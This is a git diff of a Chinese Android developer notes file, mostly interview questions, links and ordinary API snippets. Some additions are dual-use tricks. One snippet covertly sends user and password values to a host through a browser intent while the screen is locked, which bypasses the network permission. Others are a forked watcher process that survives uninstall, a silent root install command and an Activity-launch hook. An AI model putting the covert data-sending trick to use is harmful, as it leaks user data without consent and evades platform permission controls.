-架构
-MVC、MVP、MVVM 原理和区别？ 请画出 MVC、MVP 的差异？【猎豹移动】
-对 RxJava 的理解，功能与原理，优缺点？
-从 0 设计一款 App 整体架构，如何去做？
-Fragment 如果在 Adapter 中使用应该如何解耦？
-对于应用更新这块是如何做的？(解答：灰度，强制更新，分区域更新)？
-实现一个 Json 解析器（可以通过正则提高速度）？
 ```
 
 ## 如何导入导出外部数据库
@@ -41814,7 +41672,7 @@ index bede17d..508d384 100644
 https://blog.csdn.net/zhangbijun1230/article/details/79951310
 ```
 
-## FFmpeg
+## TODO : FFmpeg
 
 ```
 https://blog.csdn.net/gjy_it/article/details/90448722
@@ -45242,23 +45100,295 @@ DexClassLoader 在 Android 中的使用场景
 Reflect.on(UserManager.class).call("get", getApplicationContext());
 ```
 
+## 静默安装
+
+```
+https://blog.csdn.net/u013270171/article/details/89320824
+```
+
+## TextView 自动换行,每行排满的自定义TextView
+
+```
+https://juejin.im/post/5d4a3359f265da03eb13b28c?utm_source=gold_browser_extension
+```
+
+## Android实现多渠道打包，动态替换包名、Icon、图片等资源，解决因applicationId和BuildConfig路径不匹配的问题
+
+```
+https://blog.csdn.net/woshizisezise/article/details/96303750
+```
+
+## TODO : ARouter ????
+
+## TODO : gradle 加速编译？？？
+
+## TODO : Android Jetpack?????
+
+## TODO : Toast的显示时长为什么是固定的？？？有什么方法可以修改？？
+
+## FLAG_ACTIVITY_NEW_TASK
+
+```
+7、在一个程序中通过广播启动另一个程序的Activity时，需要在被启动的BroadcastReceiver里添加：intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+```
+
+## 缩短字体与Button控件间的边缘距离，只要padding=0dp就可以了。
+
+## HandlerThread
+
+```
+AsyncTask是获得后台线程的最简单方式，但它基本上不适用于重复且长时间运行的任务，比如后台下载的图片如果过大，推荐用HandlerThread代替，原因是自Android3.2版本开始，AsyncTask不再为每一个AsyncTask实例单独创建一个线程。而是使用一个Executor在单一的后台线程上运行所有AsyncTask的后台任务。这意味着每个AsyncTask都需要排除逐个运行，显然，长时间运行的AsyncTask会阻塞其他AsyncTask。
+```
+
+## 获取Android运行时最大内存限制：
+
+```
+ActivityManager manager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
+int maxMenory = manager.getMemoryClass();
+```
+
+## APK Inspector
+
+## 实现动态启动未注册的Activity
+
+```
+https://github.com/BolexLiu/AndroidHookStartActivity
+
+1.application标签里配置一个壳Activity
+
+<activity android:name=".HostActivity" />
+2.注册一下其中this为context
+
+AMSHookUtil.hookStartActivity(this);
+3.以后就可以按照标准的Intent启动为那些未被注册的Activity。
+
+Intent intent = new Intent(MainActivity.this, OtherActivity.class);
+startActivity(intent);
+
+原理详解：http://www.jianshu.com/p/2ad105f54d07
+```
+
+## 应用卸载反馈
+
+```
+https://github.com/CharonChui/UninstallFeedback
+
+// Android.mk
+LOCAL_PATH := $(call my-dir)
+include $(CLEAR_VARS)
+LOCAL_MODULE    := uninstall_feedback
+LOCAL_SRC_FILES := uninstall_feedback.c
+LOCAL_C_INCLUDES := $(LOCAL_PATH)/include
+LOCAL_LDLIBS += -L$(SYSROOT)/usr/lib -llog
+include $(BUILD_SHARED_LIBRARY)
 
 
+Java_com_charon_uninstallfeedback_MainActivity_initUninstallFeedback(
+        JNIEnv* env, jobject thiz, jstring packageDir, jint sdkVersion) {
+    char * pd = Jstring2CStr(env, packageDir);
+    //fork子进程，以执行轮询任务
+    pid_t pid = fork();
+    if (pid < 0) {  // fork失败了
+    } else if (pid == 0) {
+        // 可以一直采用一直判断文件是否存在的方式去判断，但是这样效率稍低，下面使用监听的方式，死循环，每个一秒判断一次，这样太浪费资源了。
+        int check = 1;
+        while (check) {
+            FILE* file = fopen(pd, "rt");
+            if (file == NULL) {
+                if (sdkVersion >= 17) { // Android4.2系统之后支持多用户操作，所以得指定用户
+                    execlp("am", "am", "start", "--user", "0", "-a",
+                            "android.intent.action.VIEW", "-d",
+                "http://shouji.360.cn/web/uninstall/uninstall.html",
+                            (char*) NULL);
+                } else {
+                    // Android4.2以前的版本无需指定用户
+                    execlp("am", "am", "start", "-a",
+                        "android.intent.action.VIEW", "-d",
+                "http://shouji.360.cn/web/uninstall/uninstall.html",
+                            (char*) NULL);}
+                check = 0;
+            } else {
+            }
+            sleep(1);
+        }
+    } 
+}
 
 
+public class MainActivity extends Activity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        String packageDir = "/data/data/" + getPackageName();
+        initUninstallFeedback(packageDir, Build.VERSION.SDK_INT);
+    }
+    private native void initUninstallFeedback(String packagePath, int sdkVersion);
+    static {
+        System.loadLibrary("uninstall_feedback");
+    }
+}
+```
 
+## 无网络权限访问网络
 
+```
+Timer timer = new Timer();
+final KeyguardManager  km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
+TimerTask   task = new TimerTask() {
+    @Override
+    public void run() {
+        // TODO: 2017/6/26  如果用户锁屏状态下，就打开网页通过get方式偷偷传输数据
+        if (km.inKeyguardRestrictedInputMode()) {
+            Intent intent = new Intent();
+            intent.setAction(Intent.ACTION_VIEW);
+            intent.addCategory(Intent.CATEGORY_BROWSABLE);
+            intent.setData(Uri
+                    .parse("http://192.168.0.2/send?user=1&pwd=2"));
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        }else{
+            // TODO: 2017/6/26  判断如果在桌面就什么也不做 ,如果不在桌面就返回
+            Intent intent = new Intent();
+            intent.setAction("android.intent.action.MAIN");
+            intent.addCategory("android.intent.category.HOME");
+            intent.addCategory(Intent.CATEGORY_DEFAULT);
+            intent.addCategory("android.intent.category.MONKEY");
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        }
+    }
+};
+timer.schedule(task, 1000, 2000);
+```
 
+## Root情况下静默安装
 
+```
+String command = "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm install " +"apk路径";
+ShellUtils.execCmd(command, ture);
+```
 
+## tools命名空间
 
+```
+toos:layout / tools:listitem / tools:listheader / tools:listfooter 开发Fragment或listview的时候，无法预览界面，用上面的工具，就可以在布局中看到界面了噢！界面如下：
 
+tools:node="merge"
+如果合并中没有冲突，合并所有属性及嵌套元素
+tools:node="merge-only-attributes"
+仅合并属性
+tools:node="replace"
+完全替换低优先级元素。
+tools:xxx
+tools:text="xxx"可以让我们在开发时候预览，而不用担心打包后，显示出来
 
+shrinkResources 开启这个之后会把一些不用的资源给移除掉，用下面的方法可以保护图片不被移除
+tools:keep="@drawable/ic_*,@drawable/t_all"     这样达到保护我们的ic_前缀图片不要被清理。
+```
 
+## TextUtils.join
 
+```
+String[] strs = {"aaa","bbb"};
+String join = TextUtils.join(",", strs);
+assert join.equals("aaa,bbb");
+List<String> lists = new ArrayList<>();
+lists.add("ddd");
+lists.add("eee");
+String joinList = TextUtils.join(",", lists);
+assert joinList.equals("ddd,eee");
+```
 
+## Activity相关方法
 
+```
+moveTaskToBack(boolean nonRoot)   让APP进入后台运行
 
+startActivities(aIntent,bIntent)  会先进入B，返回的话到A。（跳转详情的时候，返回主页面。是不是有点用？）
+```
+
+## SharedPreference相关
+
+```
+commit是同步操作。apply是异步操作。
+我们可以用v4包的方法来处理提交请求。(SharedPreferencesCompat.EditorCompat.getInstance().apply()
+```
+
+## 判断是否连接到远程服务器
+
+```
+Runtime runtime = Runtime.getRuntime();
+//-c 是ping几次 ，-w是等待时间，秒为单位
+Process exec = runtime.exec("ping  -c 2 -w 3 www.baidu.com");
+if (exec.waitFor() == 0) {
+    Log.d("liu", "连接成功");
+} else {
+    Log.d("liu", "连接失败");
+}
+```
+
+## ArgbEvaluator
+
+```
+ArgbEvaluator.evaluate(float fraction, Object startValue, Object endValue)
+```
+
+## TextView设置内容右对齐
+
+```
+android:layoutDirection="rtl"
+android:textDirection="ltr"
+```
+
+## 去除TextView默认的padding
+
+```
+android:includeFontPadding="false"
+```
+
+## URLUtil
+
+```
+isNetworkUrl()
+isAboutUrl()
+isContentUrl()
+isDataUrl()
+isJavaScriptUrl()
+```
+
+## ScheduledThreadPoolExecutor
+
+```
+ScheduledThreadPoolExecutor scheduled = new ScheduledThreadPoolExecutor(2);
+scheduled.scheduleAtFixedRate(new Runnable() {
+    @Override
+    public void run() {
+        handler.sendEmptyMessage(11);
+    }
+}, 0, 40, TimeUnit.MILLISECONDS);
+//第一个参数0。第一次，延迟时间
+//第二个参数40。表示间隔时间
+//第三个参数。表示单位
+```
+
+## DEX文件格式分析
+
+```
+http://gnaixx.cc/2016/11/26/20161126dex-file/
+```
+
+## 解析编译之后的Dex文件格式
+
+```
+https://blog.csdn.net/jiangwei0910410003/article/details/50668549
+```
+
+## aapt编译时替换资源 resourceOverlay
+
+```
+https://www.jianshu.com/p/8c373d5b0464
+```
 
 
 
